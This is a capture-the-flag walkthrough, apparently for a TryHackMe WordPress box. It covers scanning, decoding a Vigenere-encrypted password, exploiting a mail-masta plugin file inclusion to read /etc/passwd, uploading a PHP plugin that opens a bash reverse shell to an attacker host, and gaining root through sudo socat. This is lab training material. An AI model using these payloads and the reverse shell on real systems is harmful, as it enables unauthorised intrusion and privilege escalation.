# Enumeration

## \[+] 10.10.134.248 - all.thm

We will add the target IP address and a domain name to our `/etc/hosts` file. Using `sudo sh -c`, executes the entire command as a subshell as `root` where we will then use `echo` to create a new line with `\n` followed by our target IP and the domain name we give it.

```sh
sudo sh -c 'echo "\n10.10.134.248 all.thm" >> /etc/hosts'
```

Then `export` the IP address to the environment variable `RHOSTS` so I can use `$RHOSTS` instead of typing the IP address every time.

```sh
export RHOSTS=10.10.134.248
```

First, I run a quick scan with [rustscan](https://github.com/RustScan/RustScan) and a longer [nmap](https://nmap.org/) stealth scan with `-Pn` mode enabled which will treat all hosts as online which helps find other hosts that block ICMP packets:

```sh
rustscan -a $RHOSTS --ulimit 5000 -b 4500 -t 2000 --range 1-65535 -- -sC -sV
sudo nmap -v -Pn -sS -p- -A --min-rate=1000 -T4 $RHOSTS -oN nmap.txt
```

## \[+] Port 80 - HTTP

There's only a default Apache page here, so we'll start fuzzing for directories and/or files to see if we can find anything else:

![bf78de9ae8174d228cd2c5baf70ca085.png](/resources/00f44738267f4abcafb3627de0fb33d4.png)

Frpm the scan results, we find a WordPress installation, the default admin portal and a directory named `/hackathons/`.

### \[-] all.thm/hackathons

Let's check this URL with a quick `curl` request:

```sh
curl -vvv all.thm/hackathons
```

Towards the end of the body of the HTML code we'll find two comments:

![027cfa446ea686fe54d4184db0d53f93.png](/resources/0fe73d29bbf141dfaff0772a9a9e6139.png)

Looking at the ciphertext `Dvc W@iyur@123` and judging from experience, the encryption method could be either ROT, Caeser or Vigenere. Since we also got a string of text with no spaces `KeepGoing` we can try that as a key. Since Vigenere cipher is the only one that requires a key, we'll try that:

![d6d39e78235401805315a28fc0e601d0.png](/resources/cb1263a0a5ab4068886cf6d004797c80.png)

### \[-] all.thm/wordpress

Here, we'll find a basic WordPress blog and a note from the room author and the username `elyana` as the post author:

![22ccbdf3eb2dc91e39a1c38eb7fa62a6.png](/resources/4c57e8cf64c542e4b9e76b735d7791cd.png)

We can also use the [WPScan](https://github.com/wpscanteam/wpscan) tool to enumerate users, plugins, themes, etc. to see if we can find any more points of entry by running the following command:

```sh
wpscan --url http://all.thm/wordpress/ -e
```

Searching for "mail-masta exploit" we will find [this entry on Exploit-DB](https://www.exploit-db.com/exploits/40290) by Guillermo Garcia Marcos. In short, there are 5 endpoints for Local File Inclusion vulnerabilities where the variable `pl` directly takes user input and runs the code, in this case `include()` function which gets files from the system.

We can use the following URL to read the `/etc/passwd` file on the victim machine:

```sh
curl -vvv http://all.thm/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

![177b8207d0d881ddfc1a1a332b7af1b7.png](/resources/d1ecb53d58cd4d52b1fea20b645bc1d9.png)

I tried reading the `wp-config.php` file to see if I could find any credentials, but was unable to to access the configuration file.

# Initial Foothold

### \[-] all.thm/wordpress/wp-admin

Now that we have some valid usernames and a potential password, we can attempt to log in to the account `elyana`.

![f6b1bdbb6c8198059c1f607e83fa8fe2.png](/resources/339fd76eb8444239adc0fd47561395c8.png)

### \[-] www-data\@elyana

Using our access to the WordPress control panel, we can inject a PHP reverse shell so that we can execute commands on the victim machine.

To get a reverse shell, we can use this method from [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress#plugin-rce) where we upload our PHP reverse shell as a plugin.

Create the plugin with the following code and save it as `wp-plugin.php`:

```php
/*
 * Plugin Name: Shell
 */
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'") ?>
```

Then compress it into ZIP format:

```sh
zip wp-shell.zip wp-shell.php
```

![e9c8f847fb1dcbf945b53a47e1b7dc90.png](/resources/755121782ea74f73bd99f6a6959714c2.png)

![a6038f93e6fbd329624938a475eb6abc.png](/resources/389a727b59c94ab8aefb4fcaa241b5de.png)

After uploading the ZIP file you should see this message:

![e2e59d666f8692a1133bc9610876fb18.png](/resources/3938b20ea71e453da594a6b6dff59a26.png)

Back on our attacking machine, we'll start a Netcat listener in a new terminal:

```sh
nc -nvlp 4444
```

Switch to the WordPress control panel and click the "Activate Plugin" button, the page should seem like it's loading, but if we check back to our Netcat listener, we should havea connection back from the victim machine:

![6b6e97591b44239ea8abebe8cf14c2bd.png](/resources/489c9336a1054c68aef83c9364bd7dd0.png)

Let's stablize our new shell:

1. Use Python to spawn a stable shell:

   ```sh
   python3 -c 'import pty;pty.spawn("/bin/bash")'
   ```

2. `CTRL+Z` to background the current shell

3. Fix echoing and foregrounds the shell:

   ```sh
   stty raw -echo;fg
   ```

4. Set terminal to use 256 colors:

   ```sh
   export TERM=xterm-256color
   ```

# Privilege Escalation

### \[-] elyana\@elyana

Let's begin by looking for any files owned by the user `elyana` by running the `find` command with the `-user` flag to search for only files owned by `elyana` and the `-type` flag set to `f` to search for files only (no directories), then send the "junk" data to `/dev/null/`:

```sh
find / -user elyana -type f 2>/dev/null
```

![215961470e9b595326e447ea9417431e.png](/resources/3773a21d7820424291bf33d55ebbf1b5.png)

First, we'll find a hint:

```sh
cat /home/elyana/hint.txt
Elyana's user password is hidden in the system. Find it ;)
```

And then we'll find the password:

![22f8615bccf166f77944b2fe87893e1c.png](/resources/90a023c5868b46cf901586b8300cc4f6.png)

We can either use the `su elyana` command to switch over or connect via SSH.

## \[+] Port 22 - SSH

To connect via SSH we run the following command, enter "yes" and provide the password when prompted:

```sh
ssh elyana@$RHOSTS
```

![19d8e0e76e85fda926fb85bf24f233c0.png](/resources/a3232eb2c943494a9c9ebe7e18c611d1.png)

We can find the user flag in `/home/elyana/user.txt`. It's base64 encoded so we'll use `base64 -d user.txt` to decode it:

![463a77ed07beec29123cfc4afc7ea801.png](/resources/35a290fa76da4ea5b593e735eedc8834.png)

### \[-] root\@elyana

Let's start by checking the sudo permissions for our current user, `elyana` by running `sudo -l`:

![3eb41166f922087c8fbe90ba818c7df4.png](/resources/7cba031d9be64c02808b7e2c8ce84b76.png)

Using [GTFObins](https://gtfobins.github.io/gtfobins/socat/#sudo), we can find a way to escalate our privleges to root by exploiting this miscofiguration:

```sh
sudo socat stdin exec:/bin/sh
```

![abcc99c3aad419b897ed7e89f41546a6.png](/resources/fa85dd20b5d646969ee79c10687e8e97.png)

We can find the root flag in `/root/root.txt`

```sh
cd /root
ls -lah
base64 -d root.txt
```

![34a7d5a1b60040d8968ab1e3377137e2.png](/resources/9e0f37c0ca274ecaacf08c11c5effe1d.png)
